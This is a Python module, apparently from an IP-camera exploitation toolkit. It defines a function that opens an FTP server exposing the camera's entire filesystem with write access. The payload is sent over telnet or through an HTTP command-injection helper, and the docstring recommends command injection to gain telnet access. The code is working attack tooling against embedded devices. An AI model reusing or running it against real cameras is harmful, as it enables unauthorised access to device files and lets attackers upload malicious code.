from . import command_inject
from .. import decorators
import logging

"""
Imports:
    .command_inject
    ..decorators
    logging

Contains:
    start_ftp_server
"""

logger = logging.getLogger(__name__)
logger.info(f'Library imported: {__name__}')

@decorators.debug()
def start_ftp_server(telnet=None, http=None, port=21, allow_uploads=True):
    """
    Attempts to start an ftp server on the camera

    :param telnet - A <Telnet> instance
    :param http - A <Http> instance
    :param port - The ftp port to start the server on
        ... Leave this as the default 21 unless really
        ... required
    :param allow_uploads - Whether to allow uploads on
        ... the ftp server

    Note: It is *strongly* advised to use telnet
        ... If telnet is not available, you can make it available
        ... using http command injection
    """

    tag_allow_uploads = ' -w' if allow_uploads else ''

    payload_telnet = f'tcpsvd 0.0.0.0 {port} ftpd{tag_allow_uploads} /'
    payload_http = f'tcpsvd 0.0.0.0 {port} ftpd{tag_allow_uploads} / &'

    if telnet is not None:
        logger.debug(f'Using telnet to start ftp: {payload_telnet}')

        resp = telnet.execute_bg(payload_telnet)

        success = resp == ''

        if not success:
            logger.debug('Telnet failed to start ftp: {resp}')

        return success
    elif http is not None:
        logger.debug(f'Using http to start ftp: {payload_http}')

        ret = command_inject(http, payload_http, blind=True, clear=True)

        if not ret:
            logger.debug('HTTP failed to start ftp')

        return ret # Will pretty much always return False, because ftptest fails
    else:
        logger.debug('Neither a telnet, not a http instance were provided')
        
        return False
